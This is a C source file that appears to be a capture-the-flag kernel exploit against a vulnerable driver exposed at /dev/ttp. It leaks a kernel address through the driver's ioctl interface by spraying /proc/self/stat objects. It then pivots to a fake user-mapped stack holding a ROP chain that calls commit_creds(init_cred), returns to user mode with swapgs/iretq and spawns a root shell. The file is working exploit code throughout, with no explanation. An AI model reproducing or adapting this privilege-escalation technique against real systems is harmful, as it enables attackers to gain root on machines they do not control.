#include "stdio.h"
#include "stdlib.h"
#include "stdint.h"
#include "unistd.h"
#include "fcntl.h"
#include "sys/ioctl.h"
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/syscall.h>
#include <string.h>
#include "sys/mman.h"
int fd;
typedef struct {
	size_t index;
	size_t count;
	char  *buffer;
} args;
int fd2[0x3ff];
args arg;
size_t kernel_base,init_cred,commit_creds,xchg_eax_esp_ret,native_write_cr4,pop_rdi_ret;
size_t mov_rdi_rax_call_rdx,pop_rsi_ret,pop_rdx_ret,chmod_init,msleep_lay;
size_t swapgs_pop_rbp_ret,iretq_pop_rbp_ret;
void init_base(){
	iretq_pop_rbp_ret=0x39e6b+kernel_base;
	swapgs_pop_rbp_ret=0x77524+kernel_base;
	msleep_lay=0x135320+kernel_base;
	chmod_init=0x2d9630+kernel_base;
	pop_rdx_ret=0x0272d2+kernel_base;
	pop_rsi_ret=kernel_base+0x13acbe;
	mov_rdi_rax_call_rdx=0x18cb747+kernel_base;
	native_write_cr4=0x45de0+kernel_base;
	xchg_eax_esp_ret=0x7c888+kernel_base;
	init_cred = 0x165e3a0+kernel_base;
	commit_creds = 0xcc910+kernel_base;
	pop_rdi_ret=0x8e2f0+kernel_base;
}


size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
}

void shell()
{
    if(getuid() == 0)
    {
        printf("[!] Root!\n");
        system("/bin/sh");
    }
    else
    {
        printf("[!] Failed!\n");
    }
    
}
void kerror(char *msg){
	puts(msg);
	exit(-1);
}
void add(size_t index){
	ioctl(fd,0x40087401,index);
}

void dele(size_t index){
	ioctl(fd,0x40087402,index);
}

void show(size_t index,size_t count,char *buffer){
	arg.index=index;
	arg.count=count;
	arg.buffer=buffer;
	ioctl(fd,0x40087404,&arg);
}

void edit(size_t index,size_t count,char *buffer){
	arg.index=index;
	arg.count=count;
	arg.buffer=buffer;
	ioctl(fd,0x40087403,&arg);
}


void main(){
		save_status();
		fd=open("/dev/ttp",2);
		if(fd<0) kerror("[-]open failed");
		size_t buf[0x120/8];
		int i;
		memset(buf,0x41,0x120);
		for(i=0;i<0x3ff;i++){
			fd2[i]=open("/proc/self/stat",0);
			add(i);
			show(i,0x120,(char *)buf);
			if ((buf[32]&0xffffffff00000000)==0xffffffff00000000){
				kernel_base=buf[32]-0x308060;
				if((kernel_base &0xfff)==0x000){
					init_base();
					printf("kernel_base==>%p\n",kernel_base);
					printf("init_cred==>%p\n",init_cred);
					printf("commit_creds==>%p\n",commit_creds);
					printf("xchg_eax_esp_ret==>%p\n",xchg_eax_esp_ret);
					printf("native_write_cr4==>%p\n",native_write_cr4);
					size_t *fake_stack = mmap(xchg_eax_esp_ret & 0xfffff000, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
					if(fake_stack != (xchg_eax_esp_ret & 0xfffff000))
					{
						puts("[!] mmap failed");
						close(fd2[i]);
						continue;
					}
					//char *flag="/root";
					char *flag="/home/user";
					size_t base = (xchg_eax_esp_ret & 0xfff) / 8;
					size_t index = 0;
					fake_stack[base + index++] = pop_rdi_ret;
					fake_stack[base + index++] = init_cred;
					fake_stack[base + index++] = commit_creds;
					fake_stack[base + index++] = swapgs_pop_rbp_ret;
					fake_stack[base + index++] = 0;
					fake_stack[base + index++] = iretq_pop_rbp_ret;
					fake_stack[base + index++] = (size_t)shell;
					fake_stack[base + index++] = user_cs;
					fake_stack[base + index++] = user_rflags;
					fake_stack[base + index++] = user_sp;
					fake_stack[base + index++] = user_ss;
					
					for(int i=0x20;i<0x24;i++){
						buf[i]=xchg_eax_esp_ret;
						//buf[i]=0x4141414141414141;
					}
					edit(i,0x120,buf);
					for(int j=0;j<0x3ff;j++){
						read(fd2[j],buf,1);
					}
					close(fd2[i]);
					break;
				}
				
			}
		}	
		//memcpy(buf,0x41,0x120);
		//for(int i=1;i<0x3fe;i++){
		//	read(fd2[i],buf,1);
		//}
		//shell();
		close(fd);
}



